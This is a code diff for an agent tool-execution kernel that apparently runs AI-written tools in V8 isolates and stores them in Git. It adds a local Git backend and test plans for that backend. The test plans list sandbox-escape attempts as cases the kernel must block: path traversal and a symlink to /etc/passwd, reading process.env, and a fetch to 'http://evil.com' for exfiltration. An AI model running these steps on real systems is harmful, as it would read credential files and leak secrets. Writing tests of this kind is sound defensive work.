-    - [ ] Attempt `write('../outside.txt')`. **Assert**: Throws specific `SecurityViolation` error. File **must not** exist outside `TEST_ROOT`.
-    - [ ] Attempt symlink traversal. Create a symlink in `TEST_ROOT` pointing to `/etc/passwd`. Attempt `read()`. **Assert**: Throws or resolves to empty/null (depending on config).
-
-## 2. Sandbox Execution (V8)
-**Target**: `src/sandbox/isolate.ts`, `src/sandbox/bundler.ts`
-**Setup**: Instantiate real `isolated-vm`.
-
-- [ ] **Compilation**
-    - [ ] Feed raw TypeScript: `export default (a: number) => a * 2;`.
-    - [ ] **Assert**: Returns a callable function handle.
-    - [ ] Feed Syntax Error: `const x = ;`.
-    - [ ] **Assert**: Throws `CompilationError` with line number.
-- [ ] **Runtime constraints**
-    - [ ] **Memory**: Execute script that allocates 100MB buffer. **Assert**: Throws `ERR_ISOLATE_MEMORY`.
-    - [ ] **Timeout**: Execute `while(true){}`. **Assert**: Throws `ERR_ISOLATE_TIMEOUT` after 50ms (or configured limit).
-- [ ] **Determinism**
-    - [ ] Run `Math.random()`. **Assert**: If seed is configurable, output is constant. (If not, verify output format).
-
-## 3. Tool Validation logic
-**Target**: `src/tools/validation.ts`
-
-- [ ] **Static Analysis**
-    - [ ] Input source code with `process.exit()`.
-    - [ ] **Assert**: Validation fails with "Global 'process' is forbidden".
-    - [ ] Input source code with `import fs from 'fs'`.
-    - [ ] **Assert**: Validation fails if import is not in whitelist.
-````
-
 ## File: eslint.config.js
 ````javascript
 import typescriptESLint from '@typescript-eslint/eslint-plugin';
@@ -480,7 +909,7 @@ import typescriptParser from '@typescript-eslint/parser';
 
 export default [
   {
-    files: ['src/**/*.ts'],
+    files: ['src/**/*.ts', 'test/**/*.ts'],
     languageOptions: {
       parser: typescriptParser,
       parserOptions: {
@@ -495,6 +924,11 @@ export default [
         __dirname: 'readonly',
         __filename: 'readonly',
         global: 'readonly',
+        describe: 'readonly',
+        it: 'readonly',
+        expect: 'readonly',
+        beforeEach: 'readonly',
+        afterEach: 'readonly',
       },
     },
     plugins: {
@@ -542,7 +976,7 @@ export default [
     "rootDir": "./src",
     "declaration": true
   },
-  "include": ["src/**/*"]
+  "include": ["src/**/*", "test/**/*"]
 }
 ````
 
@@ -849,6 +1283,245 @@ export interface VFSAdapter {
    */
   listFiles: (dir: string, recursive?: boolean) => Promise<string[]>;
 }
+````
+
+## File: test-docs/e2e.test-plan.md
+````markdown
+# End-to-End Test Plan (Real Implementation)
+
+**Rules:**
+1.  **No Mock, No Spy**: Tests run against the built `bin/tgp.js` or the public API entry point using real dependencies (Git, SQLite, V8).
+2.  **Real Implementation**: Verification involves checking the actual effects on the filesystem, git history, and database state.
+3.  **Isolated**: Each test runs in a unique, ephemeral directory (`/tmp/tgp-e2e-${uuid}`).
+4.  **Idempotent**: Tests can be re-run without manual cleanup (handled by isolation), and operations within tests should handle existing state gracefully.
+5.  **Clean on SIGTERM**: Test harness must ensure child processes and temp files are cleaned up if the test process is interrupted.
+
+## 1. The "Cold Start" Lifecycle (GitOps + Compilation)
+**Story**: An agent wakes up in a serverless environment, connects to a repo, builds a tool, uses it, and shuts down.
+
+1.  **Setup Environment**:
+    -   Create `bare-repo.git` (The Remote).
+    -   Create `config.ts` pointing to `bare-repo.git`.
+2.  **Agent Boot**:
+    -   Initialize TGP Kernel.
+    -   **Assert**: Local filesystem is clean (except for `.git` hydration).
+3.  **Task**: "Create a fibonacci tool".
+    -   Agent calls `write_file('tools/math/fib.ts', ...)` (Real TS code).
+    -   Agent calls `check_tool('tools/math/fib.ts')`. **Assert**: Valid.
+4.  **Execution**:
+    -   Agent calls `exec_tool('tools/math/fib.ts', { n: 10 })`.
+    -   **Assert**: Result is `55`.
+5.  **Shutdown & Persist**:
+    -   Kernel calls `sync()`.
+    -   Process exits.
+6.  **Verification (The "Next" Agent)**:
+    -   Clone `bare-repo.git` to a **new** directory.
+    -   Check file existence: `tools/math/fib.ts`.
+    -   **Assert**: File content matches exactly.
+
+## 2. Multi-Agent Concurrency (The "Merge" Test)
+**Story**: Two agents forge tools simultaneously. TGP must handle Git locking and merging without human intervention.
+
+1.  **Setup**:
+    -   Initialize `bare-repo.git`.
+    -   Instantiate **Agent A** in `dir_A` and **Agent B** in `dir_B` (both pointing to `bare-repo.git`).
+2.  **Parallel Action**:
+    -   Agent A creates `tools/math/add.ts`.
+    -   Agent B creates `tools/math/subtract.ts`.
+3.  **Race Condition**:
+    -   Agent A calls `sync()` (Push succeeds).
+    -   Agent B calls `sync()` immediately after.
+        -   **Expect**: Git push rejected (non-fast-forward).
+        -   **Auto-Resolution**: TGP kernel catches error, pulls (rebase/merge), and pushes again.
+4.  **Verification**:
+    -   Inspect `bare-repo.git` history.
+    -   **Assert**: Both `add.ts` and `subtract.ts` exist in HEAD.
+    -   **Assert**: Commit history is linear or cleanly merged.
+
+## 3. The "Refactor" Scenario (Search & Replace)
+**Story**: An existing tool is broken/outdated. Agent must patch it.
+
+1.  **Pre-condition**: `tools/legacy.ts` exists with `console.log("old")`.
+2.  **Agent Action**:
+    -   Agent reads file.
+    -   Agent calls `patch_file('tools/legacy.ts', ...)` to replace `console.log` with `return`.
+3.  **Verification**:
+    -   Run `exec_tool`.
+    -   **Assert**: Output is returned value, not undefined.
+    -   Read file from disk. **Assert**: Content is updated.
+    -   **Git Verify**: Change is staged/committed in local repo (if auto-commit is on).
+
+## 4. The "Infinite Loop" Self-Defense (Resilience)
+**Story**: Agent generates malicious/buggy code that freezes.
+
+1.  **Action**: Agent creates `tools/freeze.ts` (`while(true){}`).
+2.  **Execution**: Agent calls `exec_tool('tools/freeze.ts')`.
+3.  **Observation**:
+    -   Function call throws exception `ERR_ISOLATE_TIMEOUT`.
+    -   Exception is caught by Kernel.
+    -   **Assert**: Main process (The Agent) remains alive and responsive.
+    -   **Assert**: Memory usage of Main process is stable (V8 isolate disposed).
+
+## 5. Security & Sandbox Jailbreak
+**Story**: Malicious tool attempts to access host resources.
+
+1.  **Filesystem Escape**:
+    -   Create tool `tools/hack.ts` attempting `read_file('../../../etc/passwd')`.
+    -   Execute. **Assert**: Throws `SecurityViolation`.
+2.  **Environment Theft**:
+    -   Create tool `tools/env.ts` attempting to access `process.env`.
+    -   Execute. **Assert**: Throws `ReferenceError` (process is not defined).
+3.  **Network Exfiltration**:
+    -   Create tool `tools/curl.ts` attempting `fetch('http://evil.com')`.
+    -   Execute. **Assert**: Throws `NetworkError` or `SecurityViolation` (not in whitelist).
+
+## 6. Database Transaction Safety (SQL)
+**Story**: A tool performs SQL operations. Logic error triggers rollback.
+
+1.  **Setup**:
+    -   Initialize real SQLite DB `test.db` with table `logs`.
+2.  **Success Path**:
+    -   Tool executes `INSERT INTO logs VALUES ('ok')`.
+    -   **Assert**: Row count = 1.
+3.  **Failure Path (Rollback)**:
+    -   Tool executes:
+        ```typescript
+        sql('INSERT INTO logs VALUES ("bad")');
+        throw new Error("Logic Crash");
+        ```
+    -   Kernel catches error.
+    -   **Assert**: Row count = 1 (The "bad" row was rolled back).
+
+## 7. The "SIGTERM" Cleanliness Test
+**Story**: Deployment platform kills the pod while tool is running.
+
+1.  **Setup**:
+    -   Start TGP process that writes to a database loop or holds a file lock.
+2.  **Action**:
+    -   Send `SIGTERM` to process.
+3.  **Verification**:
+    -   Check Database locks. **Assert**: Released (WAL file clean).
+    -   Check Temporary Files (`/tmp/tgp-*`). **Assert**: Deleted/Cleaned up.
+    -   Check Git Lock files (`index.lock`). **Assert**: Cleared.
+
+## 8. CLI Bootstrap Test
+**Story**: Developer initializes project.
+
+1.  **Action**: Exec `node bin/tgp.js init` in empty dir.
+2.  **Assert**:
+    -   `tgp.config.ts` created.
+    -   `.tgp` folder structure created.
+    -   `package.json` updated (if applicable).
+    -   Run `node bin/tgp.js check`. **Assert**: Passes with no tools.
+````
+
+## File: test-docs/integration.test-plan.md
+````markdown
+# Integration Test Plan (Real Implementation)
+
+**Rules:**
+1.  **No Mock, No Spy**: Tests use real Git binaries, real SQLite drivers, and real V8 isolates.
+2.  **Real Implementation**: Verification involves checking the actual effects on the filesystem, git history, and database state.
+3.  **Isolated**: Each test runs in a unique, ephemeral directory (`/tmp/tgp-integration-${uuid}`).
+4.  **Idempotent**: Tests can be re-run without manual cleanup.
+5.  **Clean on SIGTERM**: Test harness cleans up temp files if interrupted.
+
+## 1. GitOps & Persistence
+**Target**: `src/kernel/git.ts`
+**Setup**:
+1.  Create `REMOTE_DIR` (init bare repo).
+2.  Create `AGENT_DIR` (configured as TGP root).
+
+- [ ] **Hydration (Clone/Pull)**
+    - [ ] Commit a tool `tools/hello.ts` to `REMOTE_DIR` using standard `git` CLI commands.
+    - [ ] Initialize `TGP Kernel` in `AGENT_DIR`.
+    - [ ] **Assert**: `tools/hello.ts` exists in `AGENT_DIR` and is readable.
+- [ ] **Fabrication (Commit/Push)**
+    - [ ] Use Kernel to write `tools/new.ts` in `AGENT_DIR`.
+    - [ ] Trigger Kernel persistence (sync).
+    - [ ] Verify in `REMOTE_DIR` (using `git log`) that a new commit exists with the expected message.
+- [ ] **Concurrency (Locking)**
+    - [ ] Instantiate **two** Kernels pointing to the same `REMOTE_DIR` but different local dirs.
+    - [ ] Agent A writes `toolA.ts`. Agent B writes `toolB.ts`.
+    - [ ] Both sync simultaneously.
+    - [ ] **Assert**: `REMOTE_DIR` contains both files. No merge conflicts (assuming distinct files).
+
+## 2. Kernel <-> Sandbox Bridge
+**Target**: `src/sandbox/bridge.ts`
+
+- [ ] **Host Filesystem Access**
+    - [ ] Create file `data.json` in Host VFS.
+    - [ ] Create tool that uses `tgp.read_file('data.json')`.
+    - [ ] Execute tool.
+    - [ ] **Assert**: Tool returns parsed JSON.
+- [ ] **Recursive Tool Execution**
+    - [ ] Create `tools/multiplier.ts` (returns `a * b`).
+    - [ ] Create `tools/calculator.ts` that imports/calls `multiplier`.
+    - [ ] Execute `calculator`.
+    - [ ] **Assert**: Returns correct result. Verifies internal module resolution works in V8.
+
+## 3. SQL Adapter (Real SQLite)
+**Target**: `src/tools/sql.ts`
+**Setup**: Create `test.db` (SQLite). Run migration to create table `users`.
+
+- [ ] **Query Execution**
+    - [ ] Tool executes `SELECT * FROM users`.
+    - [ ] **Assert**: Returns real rows.
+- [ ] **Transaction Rollback**
+    - [ ] Tool executes:
+        1. `INSERT INTO users ...`
+        2. `throw new Error('Boom')`
+    - [ ] Catch error in test.
+    - [ ] Query `users` table.
+    - [ ] **Assert**: Count is 0 (Rollback successful).
+````
+
+## File: test-docs/unit.test-plan.md
+````markdown
+# Unit Test Plan (Real Implementation)
+
+**Rules:**
+1.  **No Mock, No Spy**: Use real file systems (node:fs), real V8 isolates (isolated-vm).
+2.  **Real Implementation**: Verify logic by observing real output/exceptions.
+3.  **Isolated**: Each test suite creates a unique temporary directory (`/tmp/tgp-unit-${uuid}`).
+4.  **Idempotent**: No shared global state between tests.
+5.  **Clean on SIGTERM**: Register `process.on('SIGTERM')` handlers to wipe temp dirs.
+
+## 1. VFS (Virtual Filesystem) - Node Adapter
+**Target**: `src/vfs/node.ts`
+**Setup**: Create a temporary directory `TEST_ROOT`.
+
+- [ ] **Real I/O Operations**
+    - [ ] `write('deep/nested/file.txt')`: Verify it creates physical directories on disk.
+    - [ ] `read('deep/nested/file.txt')`: Verify it returns exact byte content written.
+    - [ ] `list('deep')`: Verify it returns structure matching OS `ls -R`.
+- [ ] **Path Security (Jail)**
+    - [ ] Attempt `write('../outside.txt')`. **Assert**: Throws specific `SecurityViolation` error. File **must not** exist outside `TEST_ROOT`.
+    - [ ] Attempt symlink traversal. Create a symlink in `TEST_ROOT` pointing to `/etc/passwd`. Attempt `read()`. **Assert**: Throws or resolves to empty/null (depending on config).
+
+## 2. Sandbox Execution (V8)
+**Target**: `src/sandbox/isolate.ts`, `src/sandbox/bundler.ts`
+**Setup**: Instantiate real `isolated-vm`.
+
+- [ ] **Compilation**
+    - [ ] Feed raw TypeScript: `export default (a: number) => a * 2;`.
+    - [ ] **Assert**: Returns a callable function handle.
+    - [ ] Feed Syntax Error: `const x = ;`.
+    - [ ] **Assert**: Throws `CompilationError` with line number.
+- [ ] **Runtime constraints**
+    - [ ] **Memory**: Execute script that allocates 100MB buffer. **Assert**: Throws `ERR_ISOLATE_MEMORY`.
+    - [ ] **Timeout**: Execute `while(true){}`. **Assert**: Throws `ERR_ISOLATE_TIMEOUT` after 50ms (or configured limit).
+- [ ] **Determinism**
+    - [ ] Run `Math.random()`. **Assert**: If seed is configurable, output is constant. (If not, verify output format).
+
+## 3. Tool Validation logic
+**Target**: `src/tools/validation.ts`
+
+- [ ] **Static Analysis**
+    - [ ] Input source code with `process.exit()`.
+    - [ ] **Assert**: Validation fails with "Global 'process' is forbidden".
+    - [ ] Input source code with `import fs from 'fs'`.
+    - [ ] **Assert**: Validation fails if import is not in whitelist.
 ````
 
 ## File: src/sandbox/isolate.ts
@@ -1448,7 +2121,7 @@ import { z } from 'zod';
 
 // --- Git Configuration Schema ---
 export const GitConfigSchema = z.object({
-  provider: z.enum(['github', 'gitlab', 'bitbucket']),
+  provider: z.enum(['github', 'gitlab', 'bitbucket', 'local']),
   repo: z.string().min(1, "Repository name is required"),
   branch: z.string().default('main'),
   apiBaseUrl: z.string().url().default('https://api.github.com'),
@@ -2384,6 +3057,7 @@ We are hacking on the future of backend development.
 import * as git from 'isomorphic-git';
 import { TGPConfig, Logger } from '../types.js';
 import * as path from 'path';
+import { spawn } from 'child_process';
 
 /**
  * The Git Interface required by the Kernel.
@@ -2473,6 +3147,78 @@ class NotImplementedAdapter implements GitPlatformAdapter {
   }
 }
 
+// --- Local Git Implementation (Shell-based) ---
+// Used for E2E testing and Air-gapped environments
+async function execGit(args: string[], cwd: string, logger: Logger): Promise<void> {
+  return new Promise((resolve, reject) => {
+    const proc = spawn('git', args, { cwd, stdio: 'pipe' });
+    let output = '';
+    proc.stdout.on('data', d => output += d.toString());
+    proc.stderr.on('data', d => output += d.toString());
+    
+    proc.on('close', (code) => {
+      if (code === 0) resolve();
+      else reject(new Error(`Git command failed: git ${args.join(' ')} in ${cwd}\nOutput: ${output}`));
+    });
+  });
+}
+
+function createLocalGitBackend(config: TGPConfig, logger: Logger): GitBackend {
+  const dir = config.rootDir;
+  const { repo, branch } = config.git;
+
+  return {
+    async hydrate() {
+      const fs = await import('node:fs/promises');
+      const gitDirExists = await fs.stat(path.join(dir, '.git')).then(() => true).catch(() => false);
+      
+      if (!gitDirExists) {
+        logger.info(`[Local] Cloning ${repo} into ${dir}...`);
+        await fs.mkdir(path.dirname(dir), { recursive: true });
+        // Clone needs to happen in parent dir
+        // We assume 'repo' is an absolute path to a bare repo
+        await execGit(['clone', repo, path.basename(dir)], path.dirname(dir), logger);
+        
+        // Ensure we are on correct branch
+        try {
+            await execGit(['checkout', branch], dir, logger);
+        } catch {
+            logger.warn(`[Local] Failed to checkout ${branch}, assuming default.`);
+        }
+      } else {
+        logger.info(`[Local] Pulling latest from ${repo}...`);
+        await execGit(['pull', 'origin', branch], dir, logger);
+      }
+    },
+
+    async persist(message: string, files: string[]) {
+      if (files.length === 0) return;
+      logger.info(`[Local] Persisting ${files.length} files...`);
+      
+      for (const f of files) {
+        await execGit(['add', f], dir, logger);
+      }
+      
+      try {
+        await execGit(['commit', '-m', message], dir, logger);
+      } catch(e) {
+         // Commit might fail if no changes
+         logger.warn(`[Local] Commit failed (empty?):`, String(e));
+         return;
+      }
+
+      try {
+          await execGit(['push', 'origin', branch], dir, logger);
+      } catch (e) {
+          // Handle non-fast-forward by pulling first (simple auto-merge)
+          logger.warn(`[Local] Push failed. Attempting rebase...`);
+          await execGit(['pull', '--rebase', 'origin', branch], dir, logger);
+          await execGit(['push', 'origin', branch], dir, logger);
+      }
+    }
+  };
+}
+
 /**
  * Factory to create the Git Backend based on configuration.
  */
@@ -2480,6 +3226,10 @@ export function createGitBackend(deps: GitDependencies, config: TGPConfig, logge
   const dir = config.rootDir;
   const { repo, auth, branch, writeStrategy, apiBaseUrl, provider } = config.git;
   const { fs, http } = deps;
+
+  if (provider === 'local') {
+    return createLocalGitBackend(config, logger);
+  }
 
   // Configuration for isomorphic-git
   const gitOpts = {
